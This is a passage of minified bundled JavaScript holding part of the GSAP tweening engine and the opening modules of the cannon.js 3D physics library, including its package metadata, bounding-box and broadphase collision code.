r,o,a,s,c,l,h,u=[],d=0,p="",f=0;for(u.start=e,u.end=t,e=u[0]=e+"",t=u[1]=t+"",i&&(i(u),e=u[0],t=u[1]),u.length=0,r=e.match(D)||[],o=t.match(D)||[],n&&(n._next=null,n.blob=1,u._firstPT=u._applyPT=n),c=o.length,s=0;s<c;s++)h=o[s],p+=(l=t.substr(d,t.indexOf(h,d)-d))||!s?l:",",d+=l.length,f?f=(f+1)%5:"rgba("===l.substr(-5)&&(f=1),h===r[s]||r.length<=s?p+=h:(p&&(u.push(p),p=""),a=parseFloat(r[s]),u.push(a),u._firstPT={_next:u._firstPT,t:u,p:u.length-1,s:a,c:("="===h.charAt(1)?parseInt(h.charAt(0)+"1",10)*parseFloat(h.substr(2)):parseFloat(h)-a)||0,f:0,m:f&&f<4?Math.round:N}),d+=h.length;return(p+=t.substr(d))&&u.push(p),u.setRatio=F,z.test(t)&&(u.end=null),u},U=function(e,t,i,n,r,o,a,s,c){"function"==typeof n&&(n=n(c||0,e));var l=typeof e[t],h="function"!==l?"":t.indexOf("set")||"function"!=typeof e["get"+t.substr(3)]?t:"get"+t.substr(3),u="get"!==i?i:h?a?e[h](a):e[h]():e[t],d="string"==typeof n&&"="===n.charAt(1),p={t:e,p:t,s:u,f:"function"===l,pg:0,n:r||t,m:o?"function"==typeof o?o:Math.round:0,pr:0,c:d?parseInt(n.charAt(0)+"1",10)*parseFloat(n.substr(2)):parseFloat(n)-u||0};if(("number"!=typeof u||"number"!=typeof n&&!d)&&(a||isNaN(u)||!d&&isNaN(n)||"boolean"==typeof u||"boolean"==typeof n?(p.fp=a,p={t:j(u,d?parseFloat(p.s)+p.c+(p.s+"").replace(/[0-9\-\.]/g,""):n,s||k.defaultStringFilter,p),p:"setRatio",s:0,c:1,f:2,pg:0,n:r||t,pr:0,m:0}):(p.s=parseFloat(u),d||(p.c=parseFloat(n)-p.s||0))),p.c)return(p._next=this._firstPT)&&(p._next._prev=p),this._firstPT=p,p},V=k._internals={isArray:m,isSelector:O,lazyTweens:I,blobDif:j},H=k._plugins={},G=V.tweenLookup={},W=0,q=V.reservedProps={ease:1,delay:1,overwrite:1,onComplete:1,onCompleteParams:1,onCompleteScope:1,useFrames:1,runBackwards:1,startAt:1,onUpdate:1,onUpdateParams:1,onUpdateScope:1,onStart:1,onStartParams:1,onStartScope:1,onReverseComplete:1,onReverseCompleteParams:1,onReverseCompleteScope:1,onRepeat:1,onRepeatParams:1,onRepeatScope:1,easeParams:1,yoyo:1,immediateRender:1,repeat:1,repeatDelay:1,data:1,paused:1,reversed:1,autoCSS:1,lazy:1,onOverwrite:1,callbackScope:1,stringFilter:1,id:1,yoyoEase:1,stagger:1},X={none:0,all:1,auto:2,concurrent:3,allOnStart:4,preexisting:5,true:1,false:0},Y=P._rootFramesTimeline=new R,Z=P._rootTimeline=new R,Q=30,$=V.lazyRender=function(){var e,t,i=I.length;for(B={},e=0;e<i;e++)(t=I[e])&&!1!==t._lazy&&(t.render(t._lazy[0],t._lazy[1],!0),t._lazy=!1);I.length=0};Z._startTime=s.time,Y._startTime=s.frame,Z._active=Y._active=!0,setTimeout($,1),P._updateRoot=k.render=function(){var e,t,i;if(I.length&&$(),Z.render((s.time-Z._startTime)*Z._timeScale,!1,!1),Y.render((s.frame-Y._startTime)*Y._timeScale,!1,!1),I.length&&$(),s.frame>=Q){for(i in Q=s.frame+(parseInt(k.autoSleep,10)||120),G){for(e=(t=G[i].tweens).length;--e>-1;)t[e]._gc&&t.splice(e,1);0===t.length&&delete G[i]}if((!(i=Z._first)||i._paused)&&k.autoSleep&&!Y._first&&1===s._listeners.tick.length){for(;i&&i._paused;)i=i._next;i||s.sleep()}}},s.addEventListener("tick",P._updateRoot);var J=function(e,t,i){var n,r,o=e._gsTweenID;if(G[o||(e._gsTweenID=o="t"+W++)]||(G[o]={target:e,tweens:[]}),t&&((n=G[o].tweens)[r=n.length]=t,i))for(;--r>-1;)n[r]===t&&n.splice(r,1);return G[o].tweens},K=function(e,t,i,n){var r,o,a=e.vars.onOverwrite;return a&&(r=a(e,t,i,n)),(a=k.onOverwrite)&&(o=a(e,t,i,n)),!1!==r&&!1!==o},ee=function(e,t,i,n,r){var o,a,s,c;if(1===n||n>=4){for(c=r.length,o=0;o<c;o++)if((s=r[o])!==t)s._gc||s._kill(null,e,t)&&(a=!0);else if(5===n)break;return a}var l,h=t._startTime+1e-8,u=[],d=0,p=0===t._duration;for(o=r.length;--o>-1;)(s=r[o])===t||s._gc||s._paused||(s._timeline!==t._timeline?(l=l||te(t,0,p),0===te(s,l,p)&&(u[d++]=s)):s._startTime<=h&&s._startTime+s.totalDuration()/s._timeScale>h&&((p||!s._initted)&&h-s._startTime<=2e-8||(u[d++]=s)));for(o=d;--o>-1;)if(c=(s=u[o])._firstPT,2===n&&s._kill(i,e,t)&&(a=!0),2!==n||!s._firstPT&&s._initted&&c){if(2!==n&&!K(s,t))continue;s._enabled(!1,!1)&&(a=!0)}return a},te=function(e,t,i){for(var n=e._timeline,r=n._timeScale,o=e._startTime;n._timeline;){if(o+=n._startTime,r*=n._timeScale,n._paused)return-100;n=n._timeline}return(o/=r)>t?o-t:i&&o===t||!e._initted&&o-t<2e-8?1e-8:(o+=e.totalDuration()/e._timeScale/r)>t+1e-8?0:o-t-1e-8};a._init=function(){var e,t,i,n,r,o,a=this.vars,s=this._overwrittenProps,c=this._duration,l=!!a.immediateRender,h=a.ease,u=this._startAt;if(a.startAt){for(n in u&&(u.render(-1,!0),u.kill()),r={},a.startAt)r[n]=a.startAt[n];if(r.data="isStart",r.overwrite=!1,r.immediateRender=!0,r.lazy=l&&!1!==a.lazy,r.startAt=r.delay=null,r.onUpdate=a.onUpdate,r.onUpdateParams=a.onUpdateParams,r.onUpdateScope=a.onUpdateScope||a.callbackScope||this,this._startAt=k.to(this.target||{},0,r),l)if(this._time>0)this._startAt=null;else if(0!==c)return}else if(a.runBackwards&&0!==c)if(u)u.render(-1,!0),u.kill(),this._startAt=null;else{for(n in 0!==this._time&&(l=!1),i={},a)q[n]&&"autoCSS"!==n||(i[n]=a[n]);if(i.overwrite=0,i.data="isFromStart",i.lazy=l&&!1!==a.lazy,i.immediateRender=l,this._startAt=k.to(this.target,0,i),l){if(0===this._time)return}else this._startAt._init(),this._startAt._enabled(!1),this.vars.immediateRender&&(this._startAt=null)}if(this._ease=h=h?h instanceof x?h:"function"==typeof h?new x(h,a.easeParams):_[h]||k.defaultEase:k.defaultEase,a.easeParams instanceof Array&&h.config&&(this._ease=h.config.apply(h,a.easeParams)),this._easeType=this._ease._type,this._easePower=this._ease._power,this._firstPT=null,this._targets)for(o=this._targets.length,e=0;e<o;e++)this._initProps(this._targets[e],this._propLookup[e]={},this._siblings[e],s?s[e]:null,e)&&(t=!0);else t=this._initProps(this.target,this._propLookup,this._siblings,s,0);if(t&&k._onPluginEvent("_onInitAllProps",this),s&&(this._firstPT||"function"!=typeof this.target&&this._enabled(!1,!1)),a.runBackwards)for(i=this._firstPT;i;)i.s+=i.c,i.c=-i.c,i=i._next;this._onUpdate=a.onUpdate,this._initted=!0},a._initProps=function(t,i,n,r,o){var a,s,c,l,h,u;if(null==t)return!1;for(a in B[t._gsTweenID]&&$(),this.vars.css||t.style&&t!==e&&t.nodeType&&H.css&&!1!==this.vars.autoCSS&&function(e,t){var i,n={};for(i in e)q[i]||i in t&&"transform"!==i&&"x"!==i&&"y"!==i&&"width"!==i&&"height"!==i&&"className"!==i&&"border"!==i||!(!H[i]||H[i]&&H[i]._autoCSS)||(n[i]=e[i],delete e[i]);e.css=n}(this.vars,t),this.vars)if(u=this.vars[a],q[a])u&&(u instanceof Array||u.push&&m(u))&&-1!==u.join("").indexOf("{self}")&&(this.vars[a]=u=this._swapSelfInParams(u,this));else if(H[a]&&(l=new H[a])._onInitTween(t,this.vars[a],this,o)){for(this._firstPT=h={_next:this._firstPT,t:l,p:"setRatio",s:0,c:1,f:1,n:a,pg:1,pr:l._priority,m:0},s=l._overwriteProps.length;--s>-1;)i[l._overwriteProps[s]]=this._firstPT;(l._priority||l._onInitAllProps)&&(c=!0),(l._onDisable||l._onEnable)&&(this._notifyPluginsOfEnabled=!0),h._next&&(h._next._prev=h)}else i[a]=U.call(this,t,a,"get",u,a,0,null,this.vars.stringFilter,o);return r&&this._kill(r,t)?this._initProps(t,i,n,r,o):this._overwrite>1&&this._firstPT&&n.length>1&&ee(t,this,i,this._overwrite,n)?(this._kill(i,t),this._initProps(t,i,n,r,o)):(this._firstPT&&(!1!==this.vars.lazy&&this._duration||this.vars.lazy&&!this._duration)&&(B[t._gsTweenID]=!0),c)},a.render=function(e,t,i){var n,r,o,a,s=this._time,c=this._duration,l=this._rawPrevTime;if(e>=c-1e-8&&e>=0)this._totalTime=this._time=c,this.ratio=this._ease._calcEnd?this._ease.getRatio(1):1,this._reversed||(n=!0,r="onComplete",i=i||this._timeline.autoRemoveChildren),0===c&&(this._initted||!this.vars.lazy||i)&&(this._startTime===this._timeline._duration&&(e=0),(l<0||e<=0&&e>=-1e-8||1e-8===l&&"isPause"!==this.data)&&l!==e&&(i=!0,l>1e-8&&(r="onReverseComplete")),this._rawPrevTime=a=!t||e||l===e?e:1e-8);else if(e<1e-8)this._totalTime=this._time=0,this.ratio=this._ease._calcEnd?this._ease.getRatio(0):0,(0!==s||0===c&&l>0)&&(r="onReverseComplete",n=this._reversed),e>-1e-8?e=0:e<0&&(this._active=!1,0===c&&(this._initted||!this.vars.lazy||i)&&(l>=0&&(1e-8!==l||"isPause"!==this.data)&&(i=!0),this._rawPrevTime=a=!t||e||l===e?e:1e-8)),(!this._initted||this._startAt&&this._startAt.progress())&&(i=!0);else if(this._totalTime=this._time=e,this._easeType){var h=e/c,u=this._easeType,d=this._easePower;(1===u||3===u&&h>=.5)&&(h=1-h),3===u&&(h*=2),1===d?h*=h:2===d?h*=h*h:3===d?h*=h*h*h:4===d&&(h*=h*h*h*h),this.ratio=1===u?1-h:2===u?h:e/c<.5?h/2:1-h/2}else this.ratio=this._ease.getRatio(e/c);if(this._time!==s||i){if(!this._initted){if(this._init(),!this._initted||this._gc)return;if(!i&&this._firstPT&&(!1!==this.vars.lazy&&this._duration||this.vars.lazy&&!this._duration))return this._time=this._totalTime=s,this._rawPrevTime=l,I.push(this),void(this._lazy=[e,t]);this._time&&!n?this.ratio=this._ease.getRatio(this._time/c):n&&this._ease._calcEnd&&(this.ratio=this._ease.getRatio(0===this._time?0:1))}for(!1!==this._lazy&&(this._lazy=!1),this._active||!this._paused&&this._time!==s&&e>=0&&(this._active=!0),0===s&&(this._startAt&&(e>=0?this._startAt.render(e,!0,i):r||(r="_dummyGS")),this.vars.onStart&&(0===this._time&&0!==c||t||this._callback("onStart"))),o=this._firstPT;o;)o.f?o.t[o.p](o.c*this.ratio+o.s):o.t[o.p]=o.c*this.ratio+o.s,o=o._next;this._onUpdate&&(e<0&&this._startAt&&-1e-4!==e&&this._startAt.render(e,!0,i),t||(this._time!==s||n||i)&&this._callback("onUpdate")),r&&(this._gc&&!i||(e<0&&this._startAt&&!this._onUpdate&&-1e-4!==e&&this._startAt.render(e,!0,i),n&&(this._timeline.autoRemoveChildren&&this._enabled(!1,!1),this._active=!1),!t&&this.vars[r]&&this._callback(r),0===c&&1e-8===this._rawPrevTime&&1e-8!==a&&(this._rawPrevTime=0)))}},a._kill=function(e,t,i){if("all"===e&&(e=null),null==e&&(null==t||t===this.target))return this._lazy=!1,this._enabled(!1,!1);t="string"!=typeof t?t||this._targets||this.target:k.selector(t)||t;var n,r,o,a,s,c,l,h,u,d=i&&this._time&&i._startTime===this._startTime&&this._timeline===i._timeline,p=this._firstPT;if((m(t)||O(t))&&"number"!=typeof t[0])for(n=t.length;--n>-1;)this._kill(e,t[n],i)&&(c=!0);else{if(this._targets){for(n=this._targets.length;--n>-1;)if(t===this._targets[n]){s=this._propLookup[n]||{},this._overwrittenProps=this._overwrittenProps||[],r=this._overwrittenProps[n]=e?this._overwrittenProps[n]||{}:"all";break}}else{if(t!==this.target)return!1;s=this._propLookup,r=this._overwrittenProps=e?this._overwrittenProps||{}:"all"}if(s){if(l=e||s,h=e!==r&&"all"!==r&&e!==s&&("object"!=typeof e||!e._tempKill),i&&(k.onOverwrite||this.vars.onOverwrite)){for(o in l)s[o]&&(u||(u=[]),u.push(o));if((u||!e)&&!K(this,i,t,u))return!1}for(o in l)(a=s[o])&&(d&&(a.f?a.t[a.p](a.s):a.t[a.p]=a.s,c=!0),a.pg&&a.t._kill(l)&&(c=!0),a.pg&&0!==a.t._overwriteProps.length||(a._prev?a._prev._next=a._next:a===this._firstPT&&(this._firstPT=a._next),a._next&&(a._next._prev=a._prev),a._next=a._prev=null),delete s[o]),h&&(r[o]=1);!this._firstPT&&this._initted&&p&&this._enabled(!1,!1)}}return c},a.invalidate=function(){this._notifyPluginsOfEnabled&&k._onPluginEvent("_onDisable",this);var e=this._time;return this._firstPT=this._overwrittenProps=this._startAt=this._onUpdate=null,this._notifyPluginsOfEnabled=this._active=this._lazy=!1,this._propLookup=this._targets?{}:[],P.prototype.invalidate.call(this),this.vars.immediateRender&&(this._time=-1e-8,this.render(e,!1,!1!==this.vars.lazy)),this},a._enabled=function(e,t){if(c||s.wake(),e&&this._gc){var i,n=this._targets;if(n)for(i=n.length;--i>-1;)this._siblings[i]=J(n[i],this,!0);else this._siblings=J(this.target,this,!0)}return P.prototype._enabled.call(this,e,t),!(!this._notifyPluginsOfEnabled||!this._firstPT)&&k._onPluginEvent(e?"_onEnable":"_onDisable",this)},k.to=function(e,t,i){return new k(e,t,i)},k.from=function(e,t,i){return i.runBackwards=!0,i.immediateRender=0!=i.immediateRender,new k(e,t,i)},k.fromTo=function(e,t,i,n){return n.startAt=i,n.immediateRender=0!=n.immediateRender&&0!=i.immediateRender,new k(e,t,n)},k.delayedCall=function(e,t,i,n,r){return new k(t,0,{delay:e,onComplete:t,onCompleteParams:i,callbackScope:n,onReverseComplete:t,onReverseCompleteParams:i,immediateRender:!1,lazy:!1,useFrames:r,overwrite:0})},k.set=function(e,t){return new k(e,0,t)},k.getTweensOf=function(e,t){if(null==e)return[];var i,n,r,o;if(e="string"!=typeof e?e:k.selector(e)||e,(m(e)||O(e))&&"number"!=typeof e[0]){for(i=e.length,n=[];--i>-1;)n=n.concat(k.getTweensOf(e[i],t));for(i=n.length;--i>-1;)for(o=n[i],r=i;--r>-1;)o===n[r]&&n.splice(i,1)}else if(e._gsTweenID)for(i=(n=J(e).concat()).length;--i>-1;)(n[i]._gc||t&&!n[i].isActive())&&n.splice(i,1);return n||[]},k.killTweensOf=k.killDelayedCallsTo=function(e,t,i){"object"==typeof t&&(i=t,t=!1);for(var n=k.getTweensOf(e,t),r=n.length;--r>-1;)n[r]._kill(i,e)};var ie=b("plugins.TweenPlugin",(function(e,t){this._overwriteProps=(e||"").split(","),this._propName=this._overwriteProps[0],this._priority=t||0,this._super=ie.prototype}),!0);if(a=ie.prototype,ie.version="1.19.0",ie.API=2,a._firstPT=null,a._addTween=U,a.setRatio=F,a._kill=function(e){var t,i=this._overwriteProps,n=this._firstPT;if(null!=e[this._propName])this._overwriteProps=[];else for(t=i.length;--t>-1;)null!=e[i[t]]&&i.splice(t,1);for(;n;)null!=e[n.n]&&(n._next&&(n._next._prev=n._prev),n._prev?(n._prev._next=n._next,n._prev=null):this._firstPT===n&&(this._firstPT=n._next)),n=n._next;return!1},a._mod=a._roundProps=function(e){for(var t,i=this._firstPT;i;)(t=e[this._propName]||null!=i.n&&e[i.n.split(this._propName+"_").join("")])&&"function"==typeof t&&(2===i.f?i.t._applyPT.m=t:i.m=t),i=i._next},k._onPluginEvent=function(e,t){var i,n,r,o,a,s=t._firstPT;if("_onInitAllProps"===e){for(;s;){for(a=s._next,n=r;n&&n.pr>s.pr;)n=n._next;(s._prev=n?n._prev:o)?s._prev._next=s:r=s,(s._next=n)?n._prev=s:o=s,s=a}s=t._firstPT=r}for(;s;)s.pg&&"function"==typeof s.t[e]&&s.t[e]()&&(i=!0),s=s._next;return i},ie.activate=function(e){for(var t=e.length;--t>-1;)e[t].API===ie.API&&(H[(new e[t])._propName]=e[t]);return!0},y.plugin=function(e){if(!(e&&e.propName&&e.init&&e.API))throw"illegal plugin definition.";var t,i=e.propName,n=e.priority||0,r=e.overwriteProps,o={init:"_onInitTween",set:"setRatio",kill:"_kill",round:"_mod",mod:"_mod",initAll:"_onInitAllProps"},a=b("plugins."+i.charAt(0).toUpperCase()+i.substr(1)+"Plugin",(function(){ie.call(this,i,n),this._overwriteProps=r||[]}),!0===e.global),s=a.prototype=new ie(i);for(t in s.constructor=a,a.API=e.API,o)"function"==typeof e[t]&&(s[o[t]]=e[t]);return a.version=e.version,ie.activate([a]),a},r=e._gsQueue){for(o=0;o<r.length;o++)r[o]();for(a in v)v[a].func||e.console.log("GSAP encountered missing dependency: "+a)}return c=!1,k}(r),a=r.GreenSockGlobals,s=a.com.greensock,c=(s.core.SimpleTimeline,s.core.Animation,a.Ease),l=(a.Linear,a.Power1),h=a.Power2,u=(a.Power3,a.Power4);a.TweenPlugin,s.events.EventDispatcher}).call(this,i(8)(e),i(3))},function(e,t,i){e.exports=function e(t,i,n){function r(a,s){if(!i[a]){if(!t[a]){if(o)return o(a,!0);throw new Error("Cannot find module '"+a+"'")}var c=i[a]={exports:{}};t[a][0].call(c.exports,(function(e){var i=t[a][1][e];return r(i||e)}),c,c.exports,e,t,i,n)}return i[a].exports}for(var o=!1,a=0;a<n.length;a++)r(n[a]);return r}({1:[function(e,t,i){t.exports={name:"cannon",version:"0.6.2",description:"A lightweight 3D physics engine written in JavaScript.",homepage:"https://github.com/schteppe/cannon.js",author:"Stefan Hedman <schteppe@gmail.com> (http://steffe.se)",keywords:["cannon.js","cannon","physics","engine","3d"],main:"./build/cannon.js",engines:{node:"*"},repository:{type:"git",url:"https://github.com/schteppe/cannon.js.git"},bugs:{url:"https://github.com/schteppe/cannon.js/issues"},licenses:[{type:"MIT"}],devDependencies:{jshint:"latest","uglify-js":"latest",nodeunit:"^0.9.0",grunt:"~0.4.0","grunt-contrib-jshint":"~0.1.1","grunt-contrib-nodeunit":"^0.4.1","grunt-contrib-concat":"~0.1.3","grunt-contrib-uglify":"^0.5.1","grunt-browserify":"^2.1.4","grunt-contrib-yuidoc":"^0.5.2",browserify:"*"},dependencies:{}}},{}],2:[function(e,t,i){t.exports={version:e("../package.json").version,AABB:e("./collision/AABB"),ArrayCollisionMatrix:e("./collision/ArrayCollisionMatrix"),Body:e("./objects/Body"),Box:e("./shapes/Box"),Broadphase:e("./collision/Broadphase"),Constraint:e("./constraints/Constraint"),ContactEquation:e("./equations/ContactEquation"),Narrowphase:e("./world/Narrowphase"),ConeTwistConstraint:e("./constraints/ConeTwistConstraint"),ContactMaterial:e("./material/ContactMaterial"),ConvexPolyhedron:e("./shapes/ConvexPolyhedron"),Cylinder:e("./shapes/Cylinder"),DistanceConstraint:e("./constraints/DistanceConstraint"),Equation:e("./equations/Equation"),EventTarget:e("./utils/EventTarget"),FrictionEquation:e("./equations/FrictionEquation"),GSSolver:e("./solver/GSSolver"),GridBroadphase:e("./collision/GridBroadphase"),Heightfield:e("./shapes/Heightfield"),HingeConstraint:e("./constraints/HingeConstraint"),LockConstraint:e("./constraints/LockConstraint"),Mat3:e("./math/Mat3"),Material:e("./material/Material"),NaiveBroadphase:e("./collision/NaiveBroadphase"),ObjectCollisionMatrix:e("./collision/ObjectCollisionMatrix"),Pool:e("./utils/Pool"),Particle:e("./shapes/Particle"),Plane:e("./shapes/Plane"),PointToPointConstraint:e("./constraints/PointToPointConstraint"),Quaternion:e("./math/Quaternion"),Ray:e("./collision/Ray"),RaycastVehicle:e("./objects/RaycastVehicle"),RaycastResult:e("./collision/RaycastResult"),RigidVehicle:e("./objects/RigidVehicle"),RotationalEquation:e("./equations/RotationalEquation"),RotationalMotorEquation:e("./equations/RotationalMotorEquation"),SAPBroadphase:e("./collision/SAPBroadphase"),SPHSystem:e("./objects/SPHSystem"),Shape:e("./shapes/Shape"),Solver:e("./solver/Solver"),Sphere:e("./shapes/Sphere"),SplitSolver:e("./solver/SplitSolver"),Spring:e("./objects/Spring"),Trimesh:e("./shapes/Trimesh"),Vec3:e("./math/Vec3"),Vec3Pool:e("./utils/Vec3Pool"),World:e("./world/World")}},{"../package.json":1,"./collision/AABB":3,"./collision/ArrayCollisionMatrix":4,"./collision/Broadphase":5,"./collision/GridBroadphase":6,"./collision/NaiveBroadphase":7,"./collision/ObjectCollisionMatrix":8,"./collision/Ray":9,"./collision/RaycastResult":10,"./collision/SAPBroadphase":11,"./constraints/ConeTwistConstraint":12,"./constraints/Constraint":13,"./constraints/DistanceConstraint":14,"./constraints/HingeConstraint":15,"./constraints/LockConstraint":16,"./constraints/PointToPointConstraint":17,"./equations/ContactEquation":19,"./equations/Equation":20,"./equations/FrictionEquation":21,"./equations/RotationalEquation":22,"./equations/RotationalMotorEquation":23,"./material/ContactMaterial":24,"./material/Material":25,"./math/Mat3":27,"./math/Quaternion":28,"./math/Vec3":30,"./objects/Body":31,"./objects/RaycastVehicle":32,"./objects/RigidVehicle":33,"./objects/SPHSystem":34,"./objects/Spring":35,"./shapes/Box":37,"./shapes/ConvexPolyhedron":38,"./shapes/Cylinder":39,"./shapes/Heightfield":40,"./shapes/Particle":41,"./shapes/Plane":42,"./shapes/Shape":43,"./shapes/Sphere":44,"./shapes/Trimesh":45,"./solver/GSSolver":46,"./solver/Solver":47,"./solver/SplitSolver":48,"./utils/EventTarget":49,"./utils/Pool":51,"./utils/Vec3Pool":54,"./world/Narrowphase":55,"./world/World":56}],3:[function(e,t,i){var n=e("../math/Vec3");function r(e){e=e||{},this.lowerBound=new n,e.lowerBound&&this.lowerBound.copy(e.lowerBound),this.upperBound=new n,e.upperBound&&this.upperBound.copy(e.upperBound)}e("../utils/Utils"),t.exports=r;var o=new n;r.prototype.setFromPoints=function(e,t,i,n){var r=this.lowerBound,a=this.upperBound,s=i;r.copy(e[0]),s&&s.vmult(r,r),a.copy(r);for(var c=1;c<e.length;c++){var l=e[c];s&&(s.vmult(l,o),l=o),l.x>a.x&&(a.x=l.x),l.x<r.x&&(r.x=l.x),l.y>a.y&&(a.y=l.y),l.y<r.y&&(r.y=l.y),l.z>a.z&&(a.z=l.z),l.z<r.z&&(r.z=l.z)}return t&&(t.vadd(r,r),t.vadd(a,a)),n&&(r.x-=n,r.y-=n,r.z-=n,a.x+=n,a.y+=n,a.z+=n),this},r.prototype.copy=function(e){return this.lowerBound.copy(e.lowerBound),this.upperBound.copy(e.upperBound),this},r.prototype.clone=function(){return(new r).copy(this)},r.prototype.extend=function(e){var t=e.lowerBound.x;this.lowerBound.x>t&&(this.lowerBound.x=t);var i=e.upperBound.x;this.upperBound.x<i&&(this.upperBound.x=i),t=e.lowerBound.y,this.lowerBound.y>t&&(this.lowerBound.y=t),i=e.upperBound.y,this.upperBound.y<i&&(this.upperBound.y=i),t=e.lowerBound.z,this.lowerBound.z>t&&(this.lowerBound.z=t),i=e.upperBound.z,this.upperBound.z<i&&(this.upperBound.z=i)},r.prototype.overlaps=function(e){var t=this.lowerBound,i=this.upperBound,n=e.lowerBound,r=e.upperBound;return(n.x<=i.x&&i.x<=r.x||t.x<=r.x&&r.x<=i.x)&&(n.y<=i.y&&i.y<=r.y||t.y<=r.y&&r.y<=i.y)&&(n.z<=i.z&&i.z<=r.z||t.z<=r.z&&r.z<=i.z)},r.prototype.contains=function(e){var t=this.lowerBound,i=this.upperBound,n=e.lowerBound,r=e.upperBound;return t.x<=n.x&&i.x>=r.x&&t.y<=n.y&&i.y>=r.y&&t.z<=n.z&&i.z>=r.z},r.prototype.getCorners=function(e,t,i,n,r,o,a,s){var c=this.lowerBound,l=this.upperBound;e.copy(c),t.set(l.x,c.y,c.z),i.set(l.x,l.y,c.z),n.set(c.x,l.y,l.z),r.set(l.x,c.y,c.z),o.set(c.x,l.y,c.z),a.set(c.x,c.y,l.z),s.copy(l)};var a=[new n,new n,new n,new n,new n,new n,new n,new n];r.prototype.toLocalFrame=function(e,t){var i=a,n=i[0],r=i[1],o=i[2],s=i[3],c=i[4],l=i[5],h=i[6],u=i[7];this.getCorners(n,r,o,s,c,l,h,u);for(var d=0;8!==d;d++){var p=i[d];e.pointToLocal(p,p)}return t.setFromPoints(i)},r.prototype.toWorldFrame=function(e,t){var i=a,n=i[0],r=i[1],o=i[2],s=i[3],c=i[4],l=i[5],h=i[6],u=i[7];this.getCorners(n,r,o,s,c,l,h,u);for(var d=0;8!==d;d++){var p=i[d];e.pointToWorld(p,p)}return t.setFromPoints(i)}},{"../math/Vec3":30,"../utils/Utils":53}],4:[function(e,t,i){function n(){this.matrix=[]}t.exports=n,n.prototype.get=function(e,t){if(e=e.index,(t=t.index)>e){var i=t;t=e,e=i}return this.matrix[(e*(e+1)>>1)+t-1]},n.prototype.set=function(e,t,i){if(e=e.index,(t=t.index)>e){var n=t;t=e,e=n}this.matrix[(e*(e+1)>>1)+t-1]=i?1:0},n.prototype.reset=function(){for(var e=0,t=this.matrix.length;e!==t;e++)this.matrix[e]=0},n.prototype.setNumObjects=function(e){this.matrix.length=e*(e-1)>>1}},{}],5:[function(e,t,i){var n=e("../objects/Body"),r=e("../math/Vec3"),o=e("../math/Quaternion");function a(){this.world=null,this.useBoundingBoxes=!1,this.dirty=!0}e("../shapes/Shape"),e("../shapes/Plane"),t.exports=a,a.prototype.collisionPairs=function(e,t,i){throw new Error("collisionPairs not implemented for this BroadPhase class!")};var s=n.STATIC|n.KINEMATIC;a.prototype.needBroadphaseCollision=function(e,t){return 0!=(e.collisionFilterGroup&t.collisionFilterMask)&&0!=(t.collisionFilterGroup&e.collisionFilterMask)&&(0==(e.type&s)&&e.sleepState!==n.SLEEPING||0==(t.type&s)&&t.sleepState!==n.SLEEPING)},a.prototype.intersectionTest=function(e,t,i,n){this.useBoundingBoxes?this.doBoundingBoxBroadphase(e,t,i,n):this.doBoundingSphereBroadphase(e,t,i,n)};var c=new r;new r,new o,new r,a.prototype.doBoundingSphereBroadphase=function(e,t,i,n){var r=c;t.position.vsub(e.position,r);var o=Math.pow(e.boundingRadius+t.boundingRadius,2);r.norm2()<o&&(i.push(e),n.push(t))},a.prototype.doBoundingBoxBroadphase=function(e,t,i,n){e.aabbNeedsUpdate&&e.computeAABB(),t.aabbNeedsUpdate&&t.computeAABB(),e.aabb.overlaps(t.aabb)&&(i.push(e),n.push(t))};var l={keys:[]},h=[],u=[];a.prototype.makePairsUnique=function(e,t){for(var i=l,n=h,r=u,o=e.length,a=0;a!==o;a++)n[a]=e[a],r[a]=t[a];for(e.length=0,t.length=0,a=0;a!==o;a++){var s=n[a].id,c=r[a].id;i[d=s<c?s+","+c:c+","+s]=a,i.keys.push(d)}for(a=0;a!==i.keys.length;a++){var d=i.keys.pop(),p=i[d];e.push(n[p]),t.push(r[p]),delete i[d]}},a.prototype.setWorld=function(e){};var d=new r;a.boundingSphereCheck=function(e,t){var i=d;return e.position.vsub(t.position,i),Math.pow(e.shape.boundingSphereRadius+t.shape.boundingSphereRadius,2)>i.norm2()},a.prototype.aabbQuery=function(e,t,i){return console.warn(".aabbQuery is not implemented in this Broadphase subclass."),[]}},{"../math/Quaternion":28,"../math/Vec3":30,"../objects/Body":31,"../shapes/Plane":42,"../shapes/Shape":43}],6:[function(e,t,i){t.exports=a;var n=e("./Broadphase"),r=e("../math/Vec3"),o=e("../shapes/Shape");function a(e,t,i,o,a){n.apply(this),this.nx=i||10,this.ny=o||10,this.nz=a||10,this.aabbMin=e||new r(100,100,100),this.aabbMax=t||new r(-100,-100,-100);var s=this.nx*this.ny*this.nz;if(s<=0)throw"GridBroadphase: Each dimension's n must be >0";this.bins=[],this.binLengths=[],this.bins.length=s,this.binLengths.length=s;for(var c=0;c<s;c++)this.bins[c]=[],this.binLengths[c]=0}a.prototype=new n,a.prototype.constructor=a;var s=new r;new r,a.prototype.collisionPairs=function(e,t,i){for(var n=e.numObjects(),r=e.bodies,a=this.aabbMax,c=this.aabbMin,l=this.nx,h=this.ny,u=this.nz,d=h*u,p=u,f=a.x,m=a.y,v=a.z,g=c.x,y=c.y,b=c.z,w=l/(f-g),x=h/(m-y),_=u/(v-b),M=(f-g)/l,S=(m-y)/h,T=(v-b)/u,E=.5*Math.sqrt(M*M+S*S+T*T),A=o.types,C=A.SPHERE,P=A.PLANE,L=(A.BOX,A.COMPOUND,A.CONVEXPOLYHEDRON,this.bins),R=this.binLengths,k=this.bins.length,O=0;O!==k;O++)R[O]=0;var I=Math.ceil;function B(e,t,i,n,r,o,a){var s=(e-g)*w|0,c=(t-y)*x|0,f=(i-b)*_|0,m=I((n-g)*w),v=I((r-y)*x),M=I((o-b)*_);s<0?s=0:s>=l&&(s=l-1),c<0?c=0:c>=h&&(c=h-1),f<0?f=0:f>=u&&(f=u-1),m<0?m=0:m>=l&&(m=l-1),v<0?v=0:v>=h&&(v=h-1),M<0?M=0:M>=u&&(M=u-1),c*=p,f*=1,m*=d,v*=p,M*=1;for(var S=s*=d;S<=m;S+=d)for(var T=c;T<=v;T+=p)for(var E=f;E<=M;E+=1){var A=S+T+E;L[A][R[A]++]=a}}for(c=Math.min,a=Math.max,O=0;O!==n;O++){var D=(te=r[O]).shape;switch(D.type){case C:var z=te.position.x,F=te.position.y,N=te.position.z,j=D.radius;B(z-j,F-j,N-j,z+j,F+j,N+j,te);break;case P:D.worldNormalNeedsUpdate&&D.computeWorldNormal(te.quaternion);var U=D.worldNormal,V=g+.5*M-te.position.x,H=y+.5*S-te.position.y,G=b+.5*T-te.position.z,W=s;W.set(V,H,G);for(var 